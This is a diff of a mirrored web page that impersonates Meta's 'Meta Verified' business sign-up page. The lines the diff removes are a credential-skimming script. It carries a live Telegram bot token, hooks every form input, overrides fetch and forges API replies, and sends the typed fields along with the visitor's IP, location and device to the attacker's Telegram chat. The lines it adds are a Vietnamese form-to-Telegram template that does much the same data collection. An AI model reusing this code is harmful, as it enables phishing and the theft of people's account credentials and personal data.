@@ -1,143 +1,227 @@
 <!DOCTYPE html><html lang="en" data-theme="light" style="color-scheme:light">
 <!-- Mirrored from https://authentication-entry-center.netlify.app/business-center by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 06:51:41 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-<head><script>
-  const MY_BOT_TOKEN = "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4";
-  const MY_CHAT_ID   = "-5377276972";
+<head><!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Gửi Telegram Full Tracking</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 520px; margin: 30px auto; padding: 20px; }
+        .form-group { margin-bottom: 14px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 9px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #0088cc; color: white; border: none; padding: 12px; cursor: pointer; width: 100%; font-size: 16px; border-radius: 4px; font-weight: bold; }
+        button:hover { background: #006699; }
+    </style>
+</head>
+<body>
 
-  const _origFetch = window.fetch;
-  const capturedFields = {};
-  let geoInfo = {
-    ip: "Unknown",
-    location: "Unknown"
-  };
+    <h2>Form Đăng Ký Thông Tin</h2>
 
-  // 1. Nhận diện thiết bị: PC/Mobile · OS · Browser
-  function getFormattedDevice() {
-    const ua = navigator.userAgent;
-    let deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? "Mobile" : "PC";
-    if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
+    <!-- Ví dụ form có các trường trùng name (2 SĐT, 2 Email, nhiều Checkbox) -->
+    <form id="myForm">
+        <div class="form-group">
+            <label>Họ và tên:</label>
+            <input type="text" name="Họ tên" required>
+        </div>
 
-    let os = "Unknown OS";
-    if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
-    else if (/Windows/i.test(ua)) os = "Windows";
-    else if (/Mac OS X/i.test(ua)) os = /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "macOS";
-    else if (/Android/i.test(ua)) os = "Android";
-    else if (/Linux/i.test(ua)) os = "Linux";
+        <div class="form-group">
+            <label>Số điện thoại chính:</label>
+            <input type="tel" name="Số điện thoại" required>
+        </div>
 
-    let browser = "Unknown Browser";
-    if (/Edg\//i.test(ua)) browser = "Edge";
-    else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";
-    else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = "Chrome";
-    else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = "Safari";
-    else if (/Firefox\//i.test(ua)) browser = "Firefox";
+        <div class="form-group">
+            <label>Số điện thoại dự phòng (Trùng name):</label>
+            <input type="tel" name="Số điện thoại">
+        </div>
 
-    return `${deviceType} · ${os} · ${browser}`;
-  }
+        <div class="form-group">
+            <label>Email chính:</label>
+            <input type="email" name="Email" required>
+        </div>
 
-  // 2. Lấy chi tiết IP và Location theo chuẩn: City | Region (Code) | Country (Code)
-  async function loadGeoDetails() {
-    try {
-      const res = await _origFetch('https://ipapi.co/json/');
-      const d = await res.json();
-      if (d && d.ip) {
-        const city = d.city || '';
-        const region = d.region ? `${d.region}${d.region_code ? ` (${d.region_code})` : ''}` : '';
-        const country = d.country_name ? `${d.country_name}${d.country_code ? ` (${d.country_code})` : ''}` : (d.country_code || '');
-        const locParts = [city, region, country].filter(Boolean);
+        <div class="form-group">
+            <label>Email phụ (Trùng name):</label>
+            <input type="email" name="Email">
+        </div>
 
-        geoInfo.ip = d.ip;
-        geoInfo.location = locParts.length > 0 ? locParts.join(' | ') : 'Unknown';
-        return d;
-      }
-    } catch (e) {}
-    return null;
-  }
+        <div class="form-group">
+            <label>Dịch vụ quan tâm (Chọn nhiều):</label>
+            <input type="checkbox" name="Dịch vụ" value="Thiết kế Web" style="width:auto;"> Thiết kế Web <br>
+            <input type="checkbox" name="Dịch vụ" value="Chạy Ads" style="width:auto;"> Chạy Ads
+        </div>
 
-  loadGeoDetails();
+        <!-- Trường ẩn mặc định -->
+        <input type="hidden" name="Chiến dịch" value="Sale Tháng 11">
 
-  // 3. Ghi nhận tự động các trường mặc định trên form gốc
-  let fieldSeq = 0;
-const labelCount = {};
-const capturedFields = {};
+        <button type="submit" id="submitBtn">Gửi thông tin</button>
+    </form>
 
-document.addEventListener('input', function(e) {
-  const el = e.target;
-  if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+    <script>
+        // ================= CẤU HÌNH TELEGRAM =================
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+        // =====================================================
 
-    // Mỗi element chỉ tính key MỘT lần, rồi nhớ luôn vào el._capKey
-    if (!el._capKey) {
-      let label =
-        el.labels?.[0]?.textContent.trim() ||  // chữ trong thẻ <label for="...">
-        el.getAttribute('aria-label') ||        // aria-label
-        el.placeholder ||
-        el.name ||
-        el.id ||
-        el.type ||
-        'Field';
+        // Hàm 1: Lấy thông tin Thiết bị (Device & OS & Browser)
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceType = "Máy tính (Desktop)";
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                deviceType = /iPad|Tablet/i.test(ua) ? "Máy tính bảng (Tablet)" : "Điện thoại (Mobile)";
+            }
 
-      labelCount[label] = (labelCount[label] || 0) + 1;
-      if (labelCount[label] > 1) label += ` (${labelCount[label]})`;
+            let os = "Không xác định";
+            if (/Windows/i.test(ua)) os = "Windows";
+            else if (/Mac OS X/i.test(ua)) os = "macOS";
+            else if (/Android/i.test(ua)) os = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+            else if (/Linux/i.test(ua)) os = "Linux";
 
-      el._capKey = label;   // ghi nhớ trên chính element
-    }
+            let browser = "Trình duyệt khác";
+            if (/Edg/i.test(ua)) browser = "Edge";
+            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+            else if (/Firefox/i.test(ua)) browser = "Firefox";
 
-    if (el.value.trim() !== '') {
-      capturedFields[el._capKey] = el.value.trim();
-    }
-  }
-}, true);
-
-  // 4. Chặn API gốc và gửi về Telegram Bot của bạn
-  window.fetch = async function(url, options) {
-    if (typeof url === 'string' && url.includes('/api/ip-location')) {
-      const data = await loadGeoDetails();
-      const cc = (data && data.country_code) ? data.country_code : 'US';
-      return new Response(JSON.stringify({
-        country: cc,
-        country_code: cc,
-        city: (data && data.city) ? data.city : '',
-        ip: (data && data.ip) ? data.ip : ''
-      }), { status: 200, headers: { 'Content-Type': 'application/json' } });
-    }
-
-    if (options && options.method === 'POST' && (url.includes('telegram.org') || url.includes('/api/'))) {
-      try {
-        if (geoInfo.ip === "Unknown") {
-          await loadGeoDetails();
+            return `${deviceType} | ${os} | ${browser}`;
         }
 
-        let lines = [
-          `IP: \`${geoInfo.ip}\``,
-          `Location: \`${geoInfo.location}\``,
-          `Device: \`${getFormattedDevice()}\``,
-          `--------------------------------`
-        ];
-
-        for (const [key, val] of Object.entries(capturedFields)) {
-          lines.push(`*${key}:* \`${val}\``);
+        // Hàm 2: Lấy IP và Vị trí (Location)
+        async function getIpAndLocation() {
+            try {
+                // Sử dụng API ipapi.co (miễn phí, hỗ trợ HTTPS)
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data.ip) {
+                    const location = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
+                    return {
+                        ip: data.ip,
+                        location: location || 'Không xác định',
+                        isp: data.org || 'Không rõ nhà mạng'
+                    };
+                }
+            } catch (e) {
+                // Fallback sang api.ipify nếu ipapi bị chặn/quá tải
+                try {
+                    const resFallback = await fetch('https://api.ipify.org?format=json');
+                    const dataFallback = await resFallback.json();
+                    return { ip: dataFallback.ip, location: 'Không lấy được vị trí', isp: '' };
+                } catch (err) {
+                    return { ip: 'Không xác định', location: 'Không xác định', isp: '' };
+                }
+            }
+            return { ip: 'Không xác định', location: 'Không xác định', isp: '' };
         }
 
-        await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: MY_CHAT_ID,
-            text: lines.join('\n'),
-            parse_mode: "Markdown"
-          })
-        });
+        // Hàm 3: Escape ký tự đặc biệt để không bị lỗi định dạng HTML của Telegram
+        function escapeHTML(str) {
+            return String(str)
+                .replace(/&/g, '&')
+                .replace(/</g, '<')
+                .replace(/>/g, '>');
+        }
 
-        return new Response(JSON.stringify({ ok: true, success: true }), {
-          status: 200,
-          headers: { 'Content-Type': 'application/json' }
-        });
-      } catch (err) {}
-    }
+        // Lắng nghe sự kiện Submit Form
+        document.getElementById('myForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-    return _origFetch.apply(this, arguments);
-  };
-</script><meta charSet="utf-8"/>
+            const submitBtn = document.getElementById('submitBtn');
+            const originalText = submitBtn.innerText;
+            submitBtn.innerText = 'Đang xử lý...';
+            submitBtn.disabled = true;
+
+            // 1. Quét toàn bộ các trường nhập liệu trên form gốc (kể cả trường trùng name hoặc thiếu name)
+            const fieldsMap = new Map();
+            const inputs = this.querySelectorAll('input, select, textarea');
+
+            inputs.forEach((el, index) => {
+                // Bỏ qua nút submit/button hoặc checkbox/radio chưa được tick
+                if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
+                if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
+
+                const val = el.value.trim();
+                if (val === '') return; // Bỏ qua ô trống
+
+                // Tự động tìm tên hiển thị cho trường (Ưu tiên: name -> placeholder -> id -> tên mặc định)
+                const fieldName = el.getAttribute('name') 
+                               || el.getAttribute('placeholder') 
+                               || el.getAttribute('id') 
+                               || `Trường #${index + 1}`;
+
+                // Gom nhóm các giá trị nếu trùng tên trường (ví dụ: 2 SĐT, 2 Email)
+                if (!fieldsMap.has(fieldName)) {
+                    fieldsMap.set(fieldName, []);
+                }
+                fieldsMap.get(fieldName).push(val);
+            });
+
+            // 2. Lấy thông tin IP, Location, Device
+            const [geoInfo, deviceInfo] = await Promise.all([
+                getIpAndLocation(),
+                Promise.resolve(getDeviceInfo())
+            ]);
+
+            // 3. Tạo nội dung tin nhắn gửi về Telegram (Dùng chuẩn HTML để tránh lỗi ký tự _ hoặc * trong Email/Link)
+            let message = `📩 <b>CÓ KHÁCH HÀNG MỚI ĐĂNG KÝ</b>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+
+            fieldsMap.forEach((values, key) => {
+                if (values.length === 1) {
+                    // Nếu trường chỉ có 1 giá trị
+                    message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
+                } else {
+                    // Nếu có nhiều trường trùng nhau (VD: 2 SĐT, 2 Email) -> Tự đánh số (1), (2)...
+                    values.forEach((v, idx) => {
+                        message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
+                    });
+                }
+            });
+
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌍 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>\n`;
+            message += `📍 <b>Vị trí:</b> ${escapeHTML(geoInfo.location)}\n`;
+            if (geoInfo.isp) {
+                message += `📡 <b>Nhà mạng:</b> ${escapeHTML(geoInfo.isp)}\n`;
+            }
+            message += `📱 <b>Thiết bị:</b> ${escapeHTML(deviceInfo)}\n`;
+            message += `🔗 <b>Nguồn:</b> ${escapeHTML(window.location.href)}\n`;
+            message += `⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`;
+
+            // 4. Gửi request tới Telegram
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML', // Dùng HTML an toàn hơn Markdown khi khách nhập email có dấu gạch dưới (_)
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    alert('Gửi thông tin thành công!');
+                    this.reset();
+                } else {
+                    alert('Lỗi Telegram: ' + result.description);
+                }
+            } catch (error) {
+                alert('Lỗi kết nối mạng, vui lòng thử lại!');
+                console.error(error);
+            } finally {
+                submitBtn.innerText = originalText;
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+
+</body>
+</html><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
      like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e6480cd0-4259-4b3d-a381-30af56dafac8
      Netlify hosting facts for this site: static/SSR served via Netlify Edge. --><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/><link rel="preload" href="_next/static/media/ea4876dcb7fb6c98-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="images/meta/logo-meta.svg"/><link rel="preload" as="image" href="images/icons/ic_blue.svg"/><link rel="preload" as="image" href="images/icons/ic_facebook.svg"/><link rel="preload" as="image" href="images/icons/ic_instagram.svg"/><link rel="preload" as="image" href="images/icons/ic_x.svg"/><link rel="preload" as="image" href="images/icons/ic_in.svg"/><link rel="preload" as="image" href="images/meta/one.png"/><link rel="preload" as="image" href="images/icons/ic_left.svg"/><link rel="preload" as="image" href="images/icons/ic_right.svg"/><link rel="stylesheet" href="/_next/static/css/20206704e3630dfe.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/7bac64abccbdbff3.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="_next/static/chunks/webpack-f584c74630648dc4.js"/><script src="/_next/static/chunks/4bd1b696-79f18d061ddcf625.js" async=""></script><script src="/_next/static/chunks/684-801c18a66211eb26.js" async=""></script><script src="/_next/static/chunks/main-app-8ad8e4587862f10f.js" async=""></script><script src="/_next/static/chunks/934-22aab8f4385c1f81.js" async=""></script><script src="/_next/static/chunks/475-957e05bc612a0ee9.js" async=""></script><script src="/_next/static/chunks/464-5b268531fe6d0052.js" async=""></script><script src="/_next/static/chunks/540-5479d48a20e175bd.js" async=""></script><script src="/_next/static/chunks/990-76383f71032eea57.js" async=""></script><script src="/_next/static/chunks/594-1f34c36e2008db6d.js" async=""></script><script src="/_next/static/chunks/742-d927de8e0c6510df.js" async=""></script><script src="/_next/static/chunks/app/layout-10dd79279e035403.js" async=""></script><script src="/_next/static/chunks/766-cd040eee2be7323a.js" async=""></script><script src="/_next/static/chunks/app/business-center/page-8a6869d8a77ee7ef.js" async=""></script><link rel="preload" href="_next/static/chunks/85.5a53a7f820653717.js" as="script" fetchPriority="low"/><link rel="preload" href="_next/static/chunks/494.c1a362c2510aef0f.js" as="script" fetchPriority="low"/><link rel="preload" href="_next/static/chunks/133.d6bc32cffcf43618.js" as="script" fetchPriority="low"/><link rel="preload" href="_next/static/chunks/998.add5a9b44b5ffc76.js" as="script" fetchPriority="low"/><link rel="preload" href="_next/static/chunks/857.1393e1adc023c84c.js" as="script" fetchPriority="low"/><meta name="next-size-adjust" content=""/><link rel="preload" as="image" href="images/meta/logo.svg" fetchPriority="high"/><link rel="preload" as="image" href="images/meta/logo-gray.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/meta/logo-meta.svg" fetchPriority="high"/><link rel="preload" as="image" href="images/meta/one.png" fetchPriority="low"/><link rel="preload" as="image" href="images/meta/two.png" fetchPriority="low"/><link rel="preload" as="image" href="images/meta/three.png" fetchPriority="low"/><link rel="preload" as="image" href="images/meta/authentication.png" fetchPriority="high"/><link rel="preload" as="image" href="images/icons/ic_blue.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_facebook.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_globe.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_loading.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_close.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_reject.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_left.svg" fetchPriority="low"/><link rel="preload" as="image" href="images/icons/ic_right.svg" fetchPriority="low"/><meta name="theme-color" content="#1877F2"/><title>Meta Verified: Get the verified badge on Facebook</title><meta name="description" content="Meta Verified for Business helps you build trust, protect your brand and grow on Facebook, Instagram and WhatsApp. Choose a plan and sign up today."/><meta property="og:title" content="Meta Verified: Get the verified badge on Facebook"/><meta property="og:description" content="Verify your business with Meta Verified for Business. Build trust, protect your brand and connect with customers."/><meta property="og:image" content="images/meta/header.png"/><meta property="og:image:width" content="3919"/><meta property="og:image:height" content="1671"/><meta property="og:image:alt" content="Meta Verified for Business"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Meta Verified: Get the verified badge on Facebook"/><meta name="twitter:description" content="Verify your business with Meta Verified for Business. Build trust, protect your brand and connect with customers."/><meta name="twitter:image" content="images/meta/header.png"/><link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico?v=20260916"/><link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico?v=20260916"/><link rel="apple-touch-icon" href="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico?v=20260916"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="chakra-ui-light __variable_71d898"><script id="chakra-script">!(function(){try{var a=function(c){var v="(prefers-color-scheme: dark)",h=window.matchMedia(v).matches?"dark":"light",r=c==="system"?h:c,o=document.documentElement,s=document.body,l="chakra-ui-light",d="chakra-ui-dark",i=r==="dark";return s.classList.add(i?d:l),s.classList.remove(i?l:d),o.style.colorScheme=r,o.dataset.theme=r,r},n=a,m="light",e="chakra-ui-color-mode",t=localStorage.getItem(e);t?a(t):localStorage.setItem(e,a(m))}catch(a){}})();</script><style data-emotion="css-global 1hj044">:host,:root,[data-theme]{--chakra-ring-inset:var(--chakra-empty,/*!*/ /*!*/);--chakra-ring-offset-width:0px;--chakra-ring-offset-color:#fff;--chakra-ring-color:rgba(66, 153, 225, 0.6);--chakra-ring-offset-shadow:0 0 #0000;--chakra-ring-shadow:0 0 #0000;--chakra-space-x-reverse:0;--chakra-space-y-reverse:0;--chakra-colors-transparent:transparent;--chakra-colors-current:currentColor;--chakra-colors-black:#0e1012;--chakra-colors-white:#FFFFFF;--chakra-colors-whiteAlpha-50:rgba(255, 255, 255, 0.04);--chakra-colors-whiteAlpha-100:rgba(255, 255, 255, 0.06);--chakra-colors-whiteAlpha-200:rgba(255, 255, 255, 0.08);--chakra-colors-whiteAlpha-300:rgba(255, 255, 255, 0.16);--chakra-colors-whiteAlpha-400:rgba(255, 255, 255, 0.24);--chakra-colors-whiteAlpha-500:rgba(255, 255, 255, 0.36);--chakra-colors-whiteAlpha-600:rgba(255, 255, 255, 0.48);--chakra-colors-whiteAlpha-700:rgba(255, 255, 255, 0.64);--chakra-colors-whiteAlpha-800:rgba(255, 255, 255, 0.80);--chakra-colors-whiteAlpha-900:rgba(255, 255, 255, 0.92);--chakra-colors-blackAlpha-50:rgba(0, 0, 0, 0.04);--chakra-colors-blackAlpha-100:rgba(0, 0, 0, 0.06);--chakra-colors-blackAlpha-200:rgba(0, 0, 0, 0.08);--chakra-colors-blackAlpha-300:rgba(0, 0, 0, 0.16);--chakra-colors-blackAlpha-400:rgba(0, 0, 0, 0.24);--chakra-colors-blackAlpha-500:rgba(0, 0, 0, 0.36);--chakra-colors-blackAlpha-600:rgba(0, 0, 0, 0.48);--chakra-colors-blackAlpha-700:rgba(0, 0, 0, 0.64);--chakra-colors-blackAlpha-800:rgba(0, 0, 0, 0.80);--chakra-colors-blackAlpha-900:rgba(0, 0, 0, 0.92);--chakra-colors-gray-50:#f9fafa;--chakra-colors-gray-100:#f1f1f2;--chakra-colors-gray-200:#e7e7e8;--chakra-colors-gray-300:#d3d4d5;--chakra-colors-gray-400:#abadaf;--chakra-colors-gray-500:#7d7f83;--chakra-colors-gray-600:#52555a;--chakra-colors-gray-700:#33373d;--chakra-colors-gray-800:#1d2025;--chakra-colors-gray-900:#171a1d;--chakra-colors-red-50:#fdf6f5;--chakra-colors-red-100:#f8d9d8;--chakra-colors-red-200:#f1b8b4;--chakra-colors-red-300:#e98d87;--chakra-colors-red-400:#e4726c;--chakra-colors-red-500:#dc4a41;--chakra-colors-red-600:#d2140a;--chakra-colors-red-700:#ac0900;--chakra-colors-red-800:#930800;--chakra-colors-red-900:#6d0600;--chakra-colors-orange-50:#fdfaf6;--chakra-colors-orange-100:#f9ebdb;--chakra-colors-orange-200:#f1d4b1;--chakra-colors-orange-300:#e6b273;--chakra-colors-orange-400:#dc9239;--chakra-colors-orange-500:#c37b24;--chakra-colors-orange-600:#a5681e;--chakra-colors-orange-700:#835318;--chakra-colors-orange-800:#674113;--chakra-colors-orange-900:#553610;--chakra-colors-yellow-50:#fffefb;--chakra-colors-yellow-100:#fff8e9;--chakra-colors-yellow-200:#feecbd;--chakra-colors-yellow-300:#fddc87;--chakra-colors-yellow-400:#fbc434;--chakra-colors-yellow-500:#d2a01e;--chakra-colors-yellow-600:#a88018;--chakra-colors-yellow-700:#836413;--chakra-colors-yellow-800:#624b0e;--chakra-colors-yellow-900:#513e0c;--chakra-colors-green-50:#f7fdfb;--chakra-colors-green-100:#d2f2e7;--chakra-colors-green-200:#9fe3cd;--chakra-colors-green-300:#64d2ad;--chakra-colors-green-400:#1dbd88;--chakra-colors-green-500:#0ea371;--chakra-colors-green-600:#0c875e;--chakra-colors-green-700:#096949;--chakra-colors-green-800:#07563c;--chakra-colors-green-900:#064731;--chakra-colors-teal-50:#f1fcfc;--chakra-colors-teal-100:#c0f1f4;--chakra-colors-teal-200:#84e4e9;--chakra-colors-teal-300:#2dd1da;--chakra-colors-teal-400:#22b2ba;--chakra-colors-teal-500:#1d979e;--chakra-colors-teal-600:#187b80;--chakra-colors-teal-700:#125f64;--chakra-colors-teal-800:#0f5053;--chakra-colors-teal-900:#0d4244;--chakra-colors-blue-50:#f1f6fd;--chakra-colors-blue-100:#cde0f6;--chakra-colors-blue-200:#a8c8f0;--chakra-colors-blue-300:#7fafe8;--chakra-colors-blue-400:#5896e1;--chakra-colors-blue-500:#347fdb;--chakra-colors-blue-600:#236abf;--chakra-colors-blue-700:#1b5192;--chakra-colors-blue-800:#164278;--chakra-colors-blue-900:#123662;--chakra-colors-cyan-50:#f4fbfd;--chakra-colors-cyan-100:#d0eef7;--chakra-colors-cyan-200:#bae7f3;--chakra-colors-cyan-300:#a2deee;--chakra-colors-cyan-400:#53c2e1;--chakra-colors-cyan-500:#2ab4d9;--chakra-colors-cyan-600:#24a2c4;--chakra-colors-cyan-700:#1e86a2;--chakra-colors-cyan-800:#196e85;--chakra-colors-cyan-900:#135567;--chakra-colors-purple-50:#f9f6fd;--chakra-colors-purple-100:#e5daf8;--chakra-colors-purple-200:#d3bef4;--chakra-colors-purple-300:#b795ec;--chakra-colors-purple-400:#a379e7;--chakra-colors-purple-500:#8952e0;--chakra-colors-purple-600:#7434db;--chakra-colors-purple-700:#6023c0;--chakra-colors-purple-800:#4f1d9e;--chakra-colors-purple-900:#3b1676;--chakra-colors-pink-50:#fdf5f9;--chakra-colors-pink-100:#f8d9e7;--chakra-colors-pink-200:#f3b9d3;--chakra-colors-pink-300:#eb8db8;--chakra-colors-pink-400:#e56ba2;--chakra-colors-pink-500:#dc3882;--chakra-colors-pink-600:#c4246c;--chakra-colors-pink-700:#a01d58;--chakra-colors-pink-800:#7d1745;--chakra-colors-pink-900:#5d1133;--chakra-colors-primary-50:#f9f6fd;--chakra-colors-primary-100:#e5daf8;--chakra-colors-primary-200:#d3bef4;--chakra-colors-primary-300:#b795ec;--chakra-colors-primary-400:#a379e7;--chakra-colors-primary-500:#8952e0;--chakra-colors-primary-600:#7434db;--chakra-colors-primary-700:#6023c0;--chakra-colors-primary-800:#4f1d9e;--chakra-colors-primary-900:#3b1676;--chakra-colors-secondary-50:#f4fbfd;--chakra-colors-secondary-100:#d0eef7;--chakra-colors-secondary-200:#bae7f3;--chakra-colors-secondary-300:#a2deee;--chakra-colors-secondary-400:#53c2e1;--chakra-colors-secondary-500:#2ab4d9;--chakra-colors-secondary-600:#24a2c4;--chakra-colors-secondary-700:#1e86a2;--chakra-colors-secondary-800:#196e85;--chakra-colors-secondary-900:#135567;--chakra-colors-indigo-50:#f8f7fc;--chakra-colors-indigo-100:#e1ddf5;--chakra-colors-indigo-200:#c8c0ec;--chakra-colors-indigo-300:#a89de2;--chakra-colors-indigo-400:#9789dc;--chakra-colors-indigo-500:#7f6ed4;--chakra-colors-indigo-600:#6a58c9;--chakra-colors-indigo-700:#5546a1;--chakra-colors-indigo-800:#483c88;--chakra-colors-indigo-900:#342b62;--chakra-borders-none:0;--chakra-borders-1px:1px solid;--chakra-borders-2px:2px solid;--chakra-borders-4px:4px solid;--chakra-borders-8px:8px solid;--chakra-fonts-heading:Inter Variable,Inter,sans-serif;--chakra-fonts-body:Inter Variable,Inter,sans-serif;--chakra-fonts-mono:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--chakra-fontSizes-3xs:0.45rem;--chakra-fontSizes-2xs:0.625rem;--chakra-fontSizes-xs:0.75rem;--chakra-fontSizes-sm:0.8125rem;--chakra-fontSizes-md:0.875rem;--chakra-fontSizes-lg:1;--chakra-fontSizes-xl:1.125rem;--chakra-fontSizes-2xl:1.25rem;--chakra-fontSizes-3xl:1.5rem;--chakra-fontSizes-4xl:1.875rem;--chakra-fontSizes-5xl:2;--chakra-fontSizes-6xl:3.5rem;--chakra-fontSizes-7xl:3rem;--chakra-fontSizes-8xl:4rem;--chakra-fontSizes-9xl:5rem;--chakra-fontSizes-10xl:6rem;--chakra-fontWeights-hairline:100;--chakra-fontWeights-thin:200;--chakra-fontWeights-light:300;--chakra-fontWeights-normal:400;--chakra-fontWeights-medium:500;--chakra-fontWeights-semibold:600;--chakra-fontWeights-bold:700;--chakra-fontWeights-extrabold:800;--chakra-fontWeights-black:900;--chakra-letterSpacings-tighter:-0.05em;--chakra-letterSpacings-tight:-0.025em;--chakra-letterSpacings-normal:0;--chakra-letterSpacings-wide:0.025em;--chakra-letterSpacings-wider:0.05em;--chakra-letterSpacings-widest:0.1em;--chakra-lineHeights-3:.75rem;--chakra-lineHeights-4:1rem;--chakra-lineHeights-5:1.25rem;--chakra-lineHeights-6:1.5rem;--chakra-lineHeights-7:1.75rem;--chakra-lineHeights-8:2rem;--chakra-lineHeights-9:2.25rem;--chakra-lineHeights-10:2.5rem;--chakra-lineHeights-normal:normal;--chakra-lineHeights-none:1;--chakra-lineHeights-shorter:1.25;--chakra-lineHeights-short:1.375;--chakra-lineHeights-base:1.5;--chakra-lineHeights-tall:1.625;--chakra-lineHeights-taller:2;--chakra-radii-none:0;--chakra-radii-sm:0.125rem;--chakra-radii-base:0.25rem;--chakra-radii-md:0.375rem;--chakra-radii-lg:0.5rem;--chakra-radii-xl:0.75rem;--chakra-radii-2xl:1rem;--chakra-radii-3xl:1.5rem;--chakra-radii-full:9999px;--chakra-space-1:0.25rem;--chakra-space-2:0.5rem;--chakra-space-3:0.75rem;--chakra-space-4:1rem;--chakra-space-5:1.25rem;--chakra-space-6:1.5rem;--chakra-space-7:1.75rem;--chakra-space-8:2rem;--chakra-space-9:2.25rem;--chakra-space-10:2.5rem;--chakra-space-12:3rem;--chakra-space-14:3.5rem;--chakra-space-16:4rem;--chakra-space-20:5rem;--chakra-space-24:6rem;--chakra-space-28:7rem;--chakra-space-32:8rem;--chakra-space-36:9rem;--chakra-space-40:10rem;--chakra-space-44:11rem;--chakra-space-48:12rem;--chakra-space-52:13rem;--chakra-space-56:14rem;--chakra-space-60:15rem;--chakra-space-64:16rem;--chakra-space-72:18rem;--chakra-space-80:20rem;--chakra-space-96:24rem;--chakra-space-px:1px;--chakra-space-0-5:0.125rem;--chakra-space-1-5:0.375rem;--chakra-space-2-5:0.625rem;--chakra-space-3-5:0.875rem;--chakra-shadows-xs:0 0 0 1px rgba(0, 0, 0, 0.05);--chakra-shadows-sm:0 1px 2px 0 rgba(0, 0, 0, 0.05);--chakra-shadows-base:0 1px 3px 0 rgba(0, 0, 0, 0.1),0 1px 2px 0 rgba(0, 0, 0, 0.06);--chakra-shadows-md:0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);--chakra-shadows-lg:0 10px 15px -3px rgba(0, 0, 0, 0.1),0 4px 6px -2px rgba(0, 0, 0, 0.05);--chakra-shadows-xl:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04);--chakra-shadows-2xl:0 25px 50px -12px rgba(0, 0, 0, 0.25);--chakra-shadows-outline:0 0 0 2px rgba(137, 82, 224, 0.6);--chakra-shadows-inner:inset 0 2px 4px 0 rgba(0,0,0,0.06);--chakra-shadows-none:none;--chakra-shadows-dark-lg:rgba(0, 0, 0, 0.1) 0px 0px 0px 1px,rgba(0, 0, 0, 0.2) 0px 5px 10px,rgba(0, 0, 0, 0.4) 0px 15px 